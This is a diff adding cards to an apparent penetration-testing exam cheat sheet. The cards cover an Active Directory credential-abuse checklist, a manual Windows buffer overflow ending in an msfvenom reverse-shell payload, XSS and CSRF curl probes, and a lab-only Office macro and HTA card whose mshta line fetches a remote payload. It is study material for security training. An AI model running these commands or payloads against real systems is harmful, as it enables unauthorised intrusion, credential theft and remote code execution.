@@ -1165,4 +1165,68 @@ impacket-psexec <domain>/<user>@<host> -k -no-pass
     dead: "You are not domain admin and you do not have krbtgt or a computer hash. These cards are dead. Go back to BloodHound, roast, and LAPS.",
     next: "If silver is the reason you can reach one host, that host gets the Windows landing checks. Do not forge a golden ticket to 'finish' a set you can already read the flag on.",
   },
+  {
+    id: "ad-hour",
+    section: "Active Directory",
+    title: "First hour, given creds",
+    look: "The panel already gave you a username and password. This is the order, not a second copy of every AD card. The AD hour builder fills the commands from those values and keeps a tick per host.",
+    cmd: `# 1. nxc smb across the set, one password
+# 2. --shares, then --spider on one READ share
+# 3. ldapdomaindump once, bloodhound-python -c All --zip once
+# 4. Kerberoast and AS-REP. Empty files are dead
+# 5. the same password with --local-auth
+# 6. secretsdump only where you are already admin
+# 7. one hash or one ticket to the next host
+# relay and coerce stay off while exam lock is on`,
+    alive: "[+] or (Pwn3d!) on a host you can name, and a tick on that host for the step that produced it.",
+    dead: "A wall of failures, or you opened relay because the first hour felt slow.",
+    next: "The AD hour builder on this page. BloodHound, roast, shares, and pass-the-hash cards are the detail once a step is alive.",
+  },
+  {
+    id: "win-bof",
+    section: "Windows",
+    title: "Buffer overflow, manual",
+    look: "A Windows binary that crashes in Immunity Debugger when one field gets a long string. You spike, measure the offset, remove bad characters, find a JMP ESP with mona, then generate shellcode. The desk does not send the exploit.",
+    cmd: `# Immunity is attached. Spike the field that crashed.
+python3 -c 'print("A"*200)'
+# unique string, then the value in EIP
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 800
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q EIP -l 800
+# mona, in the debugger
+!mona modules
+!mona jmp -r esp -m MODULE.dll
+# msfvenom is allowed. This is a normal shell, not Meterpreter, unless you already locked it to this host.
+msfvenom -p windows/shell_reverse_tcp LHOST=<tun0> LPORT=443 -f python -b '\\x00' EXITFUNC=thread`,
+    alive: "EIP is 41414141 on the spike. pattern_offset prints an exact match. mona prints an address in a module that is not rebased and has no null.",
+    dead: "EIP is not your jump address, or every module is rebased. Do not keep changing the shellcode.",
+    next: "The buffer overflow builder on the Windows page fills LHOST, the offset, the bad-character notes, and the Python template. You still paste the JMP ESP address yourself.",
+  },
+  {
+    id: "web-client",
+    section: "Web",
+    title: "XSS and CSRF, on the app",
+    look: "A parameter or a stored field on the target's own site. You are not emailing anyone. One probe. If the page encodes it, stop.",
+    cmd: `# reflected. The tag comes back unchanged, or it does not.
+curl -s 'http://<ip>/search?q=<script>alert(1)</script>'
+# stored. Save it, then request the page that displays it.
+curl -s http://<ip>/comment/1
+# CSRF. The state change sticks with no token.
+curl -s -X POST http://<ip>/profile -d 'email=you@exam.local'`,
+    alive: "The response contains the script tag unchanged, or the profile change sticks with no CSRF token.",
+    dead: "The tag is encoded, or a missing token is rejected. One encoding, then stop.",
+    next: "The client-side builder on this page marks these exam-ok and the phishing notes lab-only.",
+  },
+  {
+    id: "web-client-lab",
+    section: "Web",
+    title: "Office macro and HTA, lab only",
+    look: "LAB ONLY. A document or an HTA that runs when a person opens it. The exam does not ask you to phish. Do not write the lure during the exam.",
+    cmd: `# lab document. AutoOpen calls one command you already use for a shell.
+# lab HTA, served from the uploads folder
+# mshta http://<tun0>/payload.hta
+# do not send either of these to a person during the exam`,
+    alive: "In a lab, the macro or mshta runs and the listener catches a shell.",
+    dead: "You are on an exam, or you are writing an email. Stop.",
+    next: "Leave this card. Go back to the service that is actually open.",
+  },
 ];
